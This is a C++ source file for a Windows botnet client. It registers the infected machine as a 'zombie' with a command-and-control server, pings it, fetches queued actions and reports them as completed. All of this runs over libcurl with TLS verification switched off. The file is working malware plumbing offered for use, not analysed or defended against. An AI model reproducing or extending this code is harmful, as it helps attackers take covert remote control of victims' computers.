#include <api.hpp>

#include <curl/curl.h>
#include <nlohmann/json.hpp>

#pragma warning (disable : 4996)
#pragma comment (lib, "advapi32.lib")
#pragma comment(lib, "libcurl.lib")
#pragma comment(lib, "Normaliz.lib")
#pragma comment(lib, "wldap32.lib" )
#pragma comment(lib, "crypt32.lib" )
#pragma comment(lib, "Ws2_32.lib")


nlohmann::json parser;


std::size_t vaev::write_function(void* data, std::size_t size, std::size_t nmemb, void* userdata)
{
	static_cast<std::string*>(userdata)->append((char*)data, size * nmemb);
	return size * nmemb;
}


bool vaev::api::create_zombie()
{
    char data[64];
    sprintf(data, "owner=%s", OWNER);

    CURL* curl = curl_easy_init();
    std::string response;

    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:4000/api/v1/zombie/Win10");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);

        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    auto json = parser.parse(response.c_str());
    if (json[("status")] == "success")
    {
        this->id = json[("identifier")];
        return true;
    }
    else if (json[("message")] == "This bot already exists") return true;

    return false;
}

bool vaev::api::ping()
{
    CURL* curl = curl_easy_init();
    std::string response;

    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL,  "http://127.0.0.1:4000/api/v1/ping");
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);

        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);

        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    auto json = parser.parse(response.c_str());
    if (json[("status")] == "success")
    {
        return true;
    }

    return false;
}

vaev::api vaev::api::begin()
{
    create_zombie();

	return *this;
}

vaev::action vaev::action::begin()
{
    CURL* curl = curl_easy_init();
    std::string response;

    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:4000/api/v1/action");
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);

        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);

        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    auto json = parser.parse(response.c_str());
    if (json[("status")] == "success")
    {
        auto action = json[("action")];

        this->e_id = action[("id")];
        this->e_type = action[("action")];
        this->e_data = action[("data")];
    }
    else
    {
        return vaev::action();
    }

    return *this;
}

bool vaev::action::completed()
{
    CURL* curl = curl_easy_init();
    std::string response;

    if (curl)
    {
        std::string url = "http://127.0.0.1:4000/api/v1/action/";
        url.append(this->e_id.c_str());

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "DELETE");

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);

        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    printf("%s\n", response.c_str());
    auto json = parser.parse(response.c_str());
    if (json[("status")] == "success")
    {
        return true;
    }

    return false;
}

vaev::action_types vaev::action::type()
{
    return this->e_type;
}

std::string vaev::action::id()
{
    return this->e_id;
}

std::string vaev::action::data()
{
    return this->e_data;
}
